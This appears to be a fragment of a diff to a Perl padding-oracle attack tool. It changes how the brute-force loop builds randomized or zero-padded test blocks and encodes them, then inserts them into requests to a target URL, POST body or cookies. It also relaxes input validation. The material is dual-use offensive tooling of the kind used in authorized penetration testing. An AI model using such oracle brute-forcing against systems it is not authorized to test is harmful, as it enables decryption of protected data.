@@ -286,18 +286,19 @@ if ($bruteForce) {
   	   if ( $resumeBlock && ($bfAttempts < ($resumeBlock - ($resumeBlock % 256)+1)) ) {
 		   #SKIP
 	   } else {
-		   my $testBytes = chr($b).$testVal;
+		   my $testBytes;
 		   if($#oracleSignatures >= 0 && $randomize || $#oracleSignatures < 0 && $printStats > 0) {
-				for (1 .. ($blockSize-3)) {
+				$testBytes = '';
+				for (1 .. $blockSize) {
 					$testBytes .= chr(int(rand(256)));
 				}
-		   } else {
+			} else {
+				$testBytes = chr($b).$testVal;
 				$testBytes .= "\x00" x ($blockSize-3);
 			}
 
-		   my $combinedBf = $testBytes;  
-		   $combinedBf .= $encryptedBytes;
-		   $combinedBf = &myEncode($combinedBf, $encoding);
+		   my $combinedBf = $testBytes . $encryptedBytes;
+		   $combinedBf = &myEncode($combinedBf, $encodingFormat);
 
 		   # Add the Query String to the URL
 		   my ($testUrl, $testPost, $testCookies) = &prepRequest($url, $post, $cookie, $sample, $combinedBf);  	  
@@ -963,7 +964,7 @@ sub promptUser {
  } elsif ($type == 2) {
   return $input;
  } else {
-  if ($input =~ /^-?\d/ && $input > 0 && $input < 256 || $input eq $default) {
+  if ($input =~ /^\d+(,\d+)+$/ || $input =~ /^-?\d+$/ && $input > 0 && $input < 256 || $input eq $default) {
    return $input;
   } else {
    &promptUser($prompt, $default);
